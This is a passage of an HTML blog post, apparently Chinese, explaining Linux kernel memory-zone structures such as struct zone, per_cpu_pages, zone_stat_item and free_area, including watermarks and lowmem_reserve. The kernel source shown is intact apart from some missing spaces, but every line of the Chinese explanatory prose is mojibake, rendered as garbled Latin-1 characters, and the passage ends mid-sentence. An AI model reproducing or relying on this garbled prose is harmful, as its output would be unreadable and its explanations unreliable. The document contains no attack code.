class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line"><span class="comment">/* Read-mostly fields */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* zone watermarks, access with *_wmark_pages(zone) macros */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _watermark[NR_WMARK];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> watermark_boost;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> nr_reserved_highatomic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We don&#x27;t know if the memory that we&#x27;re going to allocate will be</span></span><br><span class="line"><span class="comment"> * freeable or/and it will be released eventually, so to avoid totally</span></span><br><span class="line"><span class="comment"> * wasting several GB of ram we must reserve some of the lower zone</span></span><br><span class="line"><span class="comment"> * memory (otherwise we risk to run OOM on the lower zones despite</span></span><br><span class="line"><span class="comment"> * there being tons of freeable ram on the higher zones).  This array is</span></span><br><span class="line"><span class="comment"> * recalculated at runtime if the sysctl_lowmem_reserve_ratio sysctl</span></span><br><span class="line"><span class="comment"> * changes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">long</span> lowmem_reserve[MAX_NR_ZONES];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="keyword">int</span> node;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>*<span class="title">zone_pgdat</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span>__<span class="title">percpu</span> *<span class="title">per_cpu_pageset</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_zonestat</span>__<span class="title">percpu</span> *<span class="title">per_cpu_zonestats</span>;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * the high and batch values are copied to individual pagesets for</span></span><br><span class="line"><span class="comment"> * faster access</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> pageset_high;</span><br><span class="line"><span class="keyword">int</span> pageset_batch;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SPARSEMEM</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Flags for a pageblock_nr_pages block. See pageblock-flags.h.</span></span><br><span class="line"><span class="comment"> * In SPARSEMEM, this map is stored in struct mem_section</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>*pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_SPARSEMEM */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>zone_start_pfn;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * spanned_pages is the total pages spanned by the zone, including</span></span><br><span class="line"><span class="comment"> * holes, which is calculated as:</span></span><br><span class="line"><span class="comment"> * spanned_pages = zone_end_pfn - zone_start_pfn;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * present_pages is physical pages existing within the zone, which</span></span><br><span class="line"><span class="comment"> * is calculated as:</span></span><br><span class="line"><span class="comment"> *present_pages = spanned_pages - absent_pages(pages in holes);</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * present_early_pages is present pages existing within the zone</span></span><br><span class="line"><span class="comment"> * located on memory available since early boot, excluding hotplugged</span></span><br><span class="line"><span class="comment"> * memory.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * managed_pages is present pages managed by the buddy system, which</span></span><br><span class="line"><span class="comment"> * is calculated as (reserved_pages includes pages allocated by the</span></span><br><span class="line"><span class="comment"> * bootmem allocator):</span></span><br><span class="line"><span class="comment"> *managed_pages = present_pages - reserved_pages;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * cma pages is present pages that are assigned for CMA use</span></span><br><span class="line"><span class="comment"> * (MIGRATE_CMA).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * So present_pages may be used by memory hotplug or memory power</span></span><br><span class="line"><span class="comment"> * management logic to figure out unmanaged pages by checking</span></span><br><span class="line"><span class="comment"> * (present_pages - managed_pages). And managed_pages should be used</span></span><br><span class="line"><span class="comment"> * by page allocator and vm scanner to calculate all kinds of watermarks</span></span><br><span class="line"><span class="comment"> * and thresholds.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Locking rules:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * zone_start_pfn and spanned_pages are protected by span_seqlock.</span></span><br><span class="line"><span class="comment"> * It is a seqlock because it has to be read outside of zone-&gt;lock,</span></span><br><span class="line"><span class="comment"> * and it is done in the main allocator path.  But, it is written</span></span><br><span class="line"><span class="comment"> * quite infrequently.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The span_seq lock is declared along with zone-&gt;lock because it is</span></span><br><span class="line"><span class="comment"> * frequently read in proximity to zone-&gt;lock.  It&#x27;s good to</span></span><br><span class="line"><span class="comment"> * give them a chance of being in the same cacheline.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Write access to present_pages at runtime should be protected by</span></span><br><span class="line"><span class="comment"> * mem_hotplug_begin/done(). Any reader who can&#x27;t tolerant drift of</span></span><br><span class="line"><span class="comment"> * present_pages should use get_online_mems() to get a stable value.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">atomic_long_t</span>managed_pages;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>spanned_pages;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>present_pages;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_MEMORY_HOTPLUG)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>present_early_pages;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>cma_pages;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Number of isolated pageblock. It is used to solve incorrect</span></span><br><span class="line"><span class="comment"> * freepage counting problem due to racy retrieving migratetype</span></span><br><span class="line"><span class="comment"> * of pageblock. Protected by zone-&gt;lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>nr_isolate_pageblock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="comment">/* see spanned/present_pages for more description */</span></span><br><span class="line"><span class="keyword">seqlock_t</span>span_seqlock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> initialized;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write-intensive fields used from the page allocator */</span></span><br><span class="line">CACHELINE_PADDING(_pad1_);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* free areas of different sizes */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span><span class="title">free_area</span>[<span class="title">MAX_ORDER</span> + 1];</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_UNACCEPTED_MEMORY</span></span><br><span class="line"><span class="comment">/* Pages to be accepted. All pages on the list are MAX_ORDER */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">unaccepted_pages</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* zone flags, see below */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Primarily protects free_area */</span></span><br><span class="line"><span class="keyword">spinlock_t</span>lock;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write-intensive fields used by compaction and vmstats. */</span></span><br><span class="line">CACHELINE_PADDING(_pad2_);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When free pages are below this point, additional steps are taken</span></span><br><span class="line"><span class="comment"> * when reading the number of free pages to avoid per-cpu counter</span></span><br><span class="line"><span class="comment"> * drift allowing watermarks to be breached</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> percpu_drift_mark;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line"><span class="comment">/* pfn where compaction free scanner should start */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_cached_free_pfn;</span><br><span class="line"><span class="comment">/* pfn where compaction migration scanner should start */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_cached_migrate_pfn[ASYNC_AND_SYNC];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_init_migrate_pfn;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_init_free_pfn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On compaction failure, 1&lt;&lt;compact_defer_shift compactions</span></span><br><span class="line"><span class="comment"> * are skipped before trying again. The number attempted since</span></span><br><span class="line"><span class="comment"> * last failure is tracked with compact_considered.</span></span><br><span class="line"><span class="comment"> * compact_order_failed is the minimum compaction failed order.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>compact_considered;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>compact_defer_shift;</span><br><span class="line"><span class="keyword">int</span>compact_order_failed;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line"><span class="comment">/* Set to true when the PG_migrate_skip bits should be cleared */</span></span><br><span class="line"><span class="keyword">bool</span>compact_blockskip_flush;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span>contiguous;</span><br><span class="line"></span><br><span class="line">CACHELINE_PADDING(_pad3_);</span><br><span class="line"><span class="comment">/* Zone statistics */</span></span><br><span class="line"><span class="keyword">atomic_long_t</span>vm_stat[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line"><span class="keyword">atomic_long_t</span>vm_numa_event[NR_VM_NUMA_EVENT_ITEMS];</span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br></pre></td></tr></table></figure><h3 id="watermarkï¼šæ°´ä½çº¿"><a href="#watermarkï¼šæ°´ä½çº¿" class="headerlink" title="_watermarkï¼šæ°´ä½çº¿"></a>_watermarkï¼šæ°´ä½çº¿</h3><p>æ¯ä¸€ä¸ª zone éƒ½æœ‰ç€å…¶å¯¹åº”çš„ä¸‰æ¡£â€œæ°´ä½çº¿â€ï¼š <code>WMARK_MIN</code>ã€<code>WMARK_LOW</code>ã€<code>WMARK_HIGH</code>ï¼Œå­˜æ”¾åœ¨ _watermark æ•°ç»„ä¸­ï¼Œåœ¨è¿›è¡Œå†…å­˜åˆ†é…æ—¶ï¼Œåˆ†é…å™¨ï¼ˆä¾‹å¦‚ buddy systemï¼‰ä¼šæ ¹æ®å½“å‰ zone ä¸­ç©ºä½™å†…å­˜æ‰€å¤„åœ¨çš„â€œæ°´ä½çº¿â€æ¥åˆ¤æ–­å½“å‰çš„å†…å­˜çŠ¶å†µã€‚åœ¨è¿›è¡Œå†…å­˜åˆ†é…çš„æ—¶å€™ï¼Œå¦‚æœåˆ†é…å™¨ï¼ˆæ¯”å¦‚buddy allocatorï¼‰å‘ç°å½“å‰ç©ºä½™å†…å­˜çš„å€¼ä½äºâ€lowâ€ä½†é«˜äºâ€minâ€ï¼Œè¯´æ˜ç°åœ¨å†…å­˜é¢ä¸´ä¸€å®šçš„å‹åŠ›ï¼Œé‚£ä¹ˆåœ¨æ­¤æ¬¡å†…å­˜åˆ†é…å®Œæˆåï¼Œkswapdå°†è¢«å”¤é†’ï¼Œä»¥æ‰§è¡Œå†…å­˜å›æ”¶æ“ä½œã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå†…å­˜åˆ†é…è™½ç„¶ä¼šè§¦å‘å†…å­˜å›æ”¶ï¼Œä½†ä¸å­˜åœ¨è¢«å†…å­˜å›æ”¶æ‰€é˜»å¡çš„é—®é¢˜ï¼Œä¸¤è€…çš„æ‰§è¡Œå…³ç³»æ˜¯å¼‚æ­¥çš„ï¼ˆä¹‹å‰çš„kswapdå®ç°æ˜¯å‘¨æœŸæ€§è§¦å‘ï¼‰ã€‚â€lowâ€å¯ä»¥è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªè­¦æˆ’æ°´ä½çº¿ï¼Œè€Œâ€highâ€åˆ™æ˜¯ä¸€ä¸ªå®‰å…¨çš„æ°´ä½çº¿ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/8OuZhEfjHIy9AeL.png"                                     ></p><h3 id="lowmem-reserveï¼šzoneè‡ªèº«çš„ä¿ç•™å†…å­˜"><a href="#lowmem-reserveï¼šzoneè‡ªèº«çš„ä¿ç•™å†…å­˜" class="headerlink" title="lowmem_reserveï¼šzoneè‡ªèº«çš„ä¿ç•™å†…å­˜"></a>lowmem_reserveï¼šzoneè‡ªèº«çš„ä¿ç•™å†…å­˜</h3><p>åœ¨è¿›è¡Œå†…å­˜åˆ†é…æ—¶ï¼Œè‹¥å½“å‰çš„ zone æ²¡æœ‰è¶³å¤Ÿçš„å†…å­˜äº†ï¼Œåˆ™ä¼šå‘ä¸‹ä¸€ä¸ª zone ç´¢è¦å†…å­˜ï¼Œé‚£ä¹ˆè¿™å°±å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šæ¥è‡ª higher zones çš„å†…å­˜åˆ†é…è¯·æ±‚å¯èƒ½è€—å°½ lower zones çš„å†…å­˜ï¼Œä½†è¿™æ ·åˆ†é…çš„å†…å­˜æœªå¿…æ˜¯å¯é‡Šæ”¾çš„ï¼ˆfreeableï¼‰ï¼Œäº¦æˆ–è€…/ä¸”æœ€ç»ˆä¸ä¸€å®šä¼šè¢«é‡Šæ”¾ï¼Œè¿™æœ‰å¯èƒ½å¯¼è‡´ lower zones çš„å†…å­˜æå‰è€—å°½ï¼Œè€Œ higher zones å´ä»ä¿ç•™æœ‰å¤§é‡çš„å†…å­˜</p><p>ä¸ºäº†é¿å…è¿™æ ·çš„ä¸€ç§æƒ…å†µçš„å‘ç”Ÿï¼Œ<code>lowmem_reserve</code> å­—æ®µç”¨ä»¥å£°æ˜ä¸ºè¯¥ zone ä¿ç•™çš„å†…å­˜ï¼Œè¿™ä¸€å—å†…å­˜åˆ«çš„ zone æ˜¯ä¸èƒ½åŠ¨çš„</p><h3 id="nodeï¼šNUMAä¸­æ ‡è¯†æ‰€å±node"><a href="#nodeï¼šNUMAä¸­æ ‡è¯†æ‰€å±node" class="headerlink" title="nodeï¼šNUMAä¸­æ ‡è¯†æ‰€å±node"></a>nodeï¼šNUMAä¸­æ ‡è¯†æ‰€å±node</h3><p>åªæœ‰åœ¨<code>CONFIG_NUMA</code>å³å¼€å¯NUMAæ—¶è¯¥å­—æ®µæ‰ä¼šè¢«å¯ç”¨ï¼Œç”¨æ¥æ ‡è¯†è¯¥zoneæ‰€å±çš„nodeã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/uwbo53W2Mjh1gOm.png"                                     ></p><h3 id="zone-pgdatï¼šzone-æ‰€å±çš„-pglist-data-èŠ‚ç‚¹"><a href="#zone-pgdatï¼šzone-æ‰€å±çš„-pglist-data-èŠ‚ç‚¹" class="headerlink" title="zone_pgdatï¼šzone æ‰€å±çš„ pglist_data èŠ‚ç‚¹"></a>zone_pgdatï¼šzone æ‰€å±çš„ pglist_data èŠ‚ç‚¹</h3><p>è¯¥å­—æ®µç”¨ä»¥æ ‡è¯†è¯¥ zone æ‰€å±çš„ pglist_data èŠ‚ç‚¹</p><h3 id="per-cpu-pagesetï¼šzone-ä¸ºæ¯ä¸ª-CPU-åˆ’åˆ†ä¸€ä¸ªç‹¬ç«‹çš„â€é¡µé¢ä»“åº“â€œ"><a href="#per-cpu-pagesetï¼šzone-ä¸ºæ¯ä¸ª-CPU-åˆ’åˆ†ä¸€ä¸ªç‹¬ç«‹çš„â€é¡µé¢ä»“åº“â€œ" class="headerlink" title="per_cpu_pagesetï¼šzone ä¸ºæ¯ä¸ª CPU åˆ’åˆ†ä¸€ä¸ªç‹¬ç«‹çš„â€é¡µé¢ä»“åº“â€œ"></a>per_cpu_pagesetï¼šzone ä¸ºæ¯ä¸ª CPU åˆ’åˆ†ä¸€ä¸ªç‹¬ç«‹çš„â€é¡µé¢ä»“åº“â€œ</h3><p>ä¼—æ‰€å‘¨çŸ¥ä¼´éšç€å¤š CPU çš„å¼•å…¥ï¼Œæ¡ä»¶ç«äº‰å°±æ˜¯ä¸€ä¸ªä¸å¯å¿½è§†çš„é—®é¢˜ï¼Œå½“å¤šä¸ª CPU éœ€è¦å¯¹ä¸€ä¸ª zone è¿›è¡Œæ“ä½œæ—¶ï¼Œé¢‘ç¹çš„åŠ é”/è§£é”æ“ä½œåˆ™æ¯«æ— ç–‘é—®ä¼šé€ æˆå¤§é‡çš„å¼€é”€ï¼Œå› æ­¤ zone å¼•å…¥äº† <code>per_cpu_pageset</code> ç»“æ„ä½“æˆå‘˜ï¼Œå³ä¸ºæ¯ä¸€ä¸ª CPU éƒ½å‡†å¤‡ä¸€ä¸ªå•ç‹¬çš„é¡µé¢ä»“åº“ï¼Œå› æ­¤å…¶å®ç°æ–¹å¼æ˜¯å®ç°ä¸ºä¸€ä¸ª <code>percpu</code> å˜é‡ã€‚åœ¨ä¸€å¼€å§‹æ—¶<code>buddy system</code>ä¼šå°†é¡µé¢æ”¾ç½®åˆ°å„ä¸ª CPU è‡ªå·±ç‹¬ç«‹çš„é¡µé¢ä»“åº“ä¸­ï¼Œéœ€è¦è¿›è¡Œåˆ†é…æ—¶ CPU ä¼˜å…ˆä»è‡ªå·±çš„é¡µé¢ä»“åº“ä¸­åˆ†é…ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> &#123;</span></span><br><span class="line"><span class="keyword">spinlock_t</span> lock;<span class="comment">/* Protects lists field */</span></span><br><span class="line"><span class="keyword">int</span> count;<span class="comment">/* number of pages in the list */</span></span><br><span class="line"><span class="keyword">int</span> high;<span class="comment">/* high watermark, emptying needed */</span></span><br><span class="line"><span class="keyword">int</span> batch;<span class="comment">/* chunk size for buddy add/remove */</span></span><br><span class="line"><span class="keyword">short</span> free_factor;<span class="comment">/* batch scaling factor during free */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="keyword">short</span> expire;<span class="comment">/* When 0, remote pagesets are drained */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Lists of pages, one per migrate type stored on the pcp-lists */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lists</span>[<span class="title">NR_PCP_LISTS</span>];</span></span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br></pre></td></tr></table></figure><p>è¯¥ç»“æ„ä½“ä¼šè¢«å­˜æ”¾åœ¨æ¯ä¸ª CPU è‡ªå·±ç‹¬ç«‹çš„ <code>.data..percpu</code> æ®µä¸­ã€‚</p><h3 id="vm-statï¼šç»Ÿè®¡æ•°æ®"><a href="#vm-statï¼šç»Ÿè®¡æ•°æ®" class="headerlink" title="vm_statï¼šç»Ÿè®¡æ•°æ®"></a>vm_statï¼šç»Ÿè®¡æ•°æ®</h3><p>è¯¥æ•°ç»„ç”¨æ¥è¿›è¡Œæ•°æ®ç»Ÿè®¡ï¼ŒæŒ‰ç…§æšä¸¾ç±»å‹ <code>zone_stat_item</code> åˆ†ä¸ºå¤šä¸ªæ•°ç»„ï¼Œä»¥ç»Ÿè®¡ä¸åŒç±»å‹çš„æ•°æ®ï¼ˆæ¯”å¦‚è¯´ <code>NR_FREE_PAGES</code> è¡¨ç¤º zone ä¸­çš„ç©ºé—²é¡µé¢1æ•°é‡ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_stat_item</span> &#123;</span></span><br><span class="line"><span class="comment">/* First 128 byte cacheline (assuming 64 bit words) */</span></span><br><span class="line">NR_FREE_PAGES,</span><br><span class="line">NR_ZONE_LRU_BASE, <span class="comment">/* Used only for compaction and reclaim retry */</span></span><br><span class="line">NR_ZONE_INACTIVE_ANON = NR_ZONE_LRU_BASE,</span><br><span class="line">NR_ZONE_ACTIVE_ANON,</span><br><span class="line">NR_ZONE_INACTIVE_FILE,</span><br><span class="line">NR_ZONE_ACTIVE_FILE,</span><br><span class="line">NR_ZONE_UNEVICTABLE,</span><br><span class="line">NR_ZONE_WRITE_PENDING,<span class="comment">/* Count of dirty, writeback and unstable pages */</span></span><br><span class="line">NR_MLOCK,<span class="comment">/* mlock()ed pages found and moved off LRU */</span></span><br><span class="line"><span class="comment">/* Second 128 byte cacheline */</span></span><br><span class="line">NR_BOUNCE,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> IS_ENABLED(CONFIG_ZSMALLOC)</span></span><br><span class="line">NR_ZSPAGES,<span class="comment">/* allocated in zsmalloc */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">NR_FREE_CMA_PAGES,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_UNACCEPTED_MEMORY</span></span><br><span class="line">NR_UNACCEPTED,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">NR_VM_ZONE_STAT_ITEMS &#125;;</span><br></pre></td></tr></table></figure><h3 id="free-areaï¼šbuddy-system-æŒ‰ç…§-order-ç®¡ç†çš„é¡µé¢"><a href="#free-areaï¼šbuddy-system-æŒ‰ç…§-order-ç®¡ç†çš„é¡µé¢" class="headerlink" title="free_areaï¼šbuddy system æŒ‰ç…§ order ç®¡ç†çš„é¡µé¢"></a>free_areaï¼šbuddy system æŒ‰ç…§ order ç®¡ç†çš„é¡µé¢</h3><p>è¯¥å­—æ®µç”¨ä»¥å­˜å‚¨<code>buddy system</code>æŒ‰ç…§ order ç®¡ç†çš„é¡µé¢ï¼Œä¸ºä¸€ä¸ª <code>free_area</code> ç»“æ„ä½“æ•°ç»„ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>nr_free;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨ free_area ä¸­å­˜æ”¾çš„é¡µé¢é€šè¿‡è‡ªèº«çš„ç›¸åº”å­—æ®µè¿æ¥æˆåŒå‘é“¾è¡¨ç»“æ„</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/sOwdI5YMNUjLSib.png"                                     ></p><p>free_area ä¸­å¹¶éåªæœ‰ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œè€Œæ˜¯æŒ‰ç…§ä¸åŒçš„â€œè¿ç§»ç±»å‹â€ï¼ˆmigrate typeï¼‰è¿›è¡Œåˆ†å¼€å­˜æ”¾ï¼Œè¿™æ˜¯ç”±äºé¡µé¢è¿ç§»æœºåˆ¶çš„å­˜åœ¨ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/sbNImKo6tBS5GUe.png"                                     ></p><h3 id="åç»­æˆå‘˜"><a href="#åç»­æˆå‘˜" class="headerlink" title="åç»­æˆå‘˜"></a>åç»­æˆå‘˜</h3><p><strong>zone_start_pfnï¼šzone çš„èµ·å§‹ç‰©ç†PFN</strong></p><p>è¯¥å­—æ®µç”¨ä»¥æ ‡è¯†è¯¥ zone çš„èµ·å§‹ç‰©ç†é¡µå¸§å·ã€‚</p><p><strong>spanned_pagesï¼šzone å¯¹åº”çš„å†…å­˜åŒºåŸŸä¸­çš„ pages æ€»æ•°ï¼ˆåŒ…æ‹¬ç©ºæ´ï¼‰</strong></p><p>è¯¥å­—æ®µç”¨ä»¥æ ‡è¯†è¯¥ zone å¯¹åº”çš„å†…å­˜åŒºåŸŸä¸­çš„ pages æ€»æ•°, <strong>åŒ…æ‹¬ç©ºæ´</strong></p><p><strong>present_pagesï¼š zone ä¸­å­˜åœ¨çš„ç‰©ç†é¡µæ¡†æ•°</strong></p><p>è¯¥å­—æ®µç”¨ä»¥æ ‡è¯† zone ä¸­å®é™…å­˜åœ¨çš„ç‰©ç†é¡µæ¡†æ•°</p><p><strong>managed_pagesï¼šzone ä¸­ buddy system 